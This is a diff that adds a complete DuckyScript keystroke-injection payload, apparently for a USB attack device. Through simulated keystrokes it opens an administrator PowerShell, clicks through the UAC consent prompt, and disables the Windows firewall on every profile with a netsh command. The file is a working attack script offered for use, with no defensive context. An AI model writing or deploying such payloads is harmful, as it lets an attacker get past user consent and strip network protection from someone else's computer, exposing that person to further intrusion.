@@ -1,0 +1,18 @@
+REM ***********************************
+REM open the powershell with admin user
+REM ***********************************
+DELAY 1000
+GUI r
+DELAY 100
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1000
+LEFT
+ENTER
+REM **********************************
+REM disable firewall with this command
+REM **********************************
+DELAY 700
+STRING netsh advfirewall set allprofiles state off
+ENTER
+
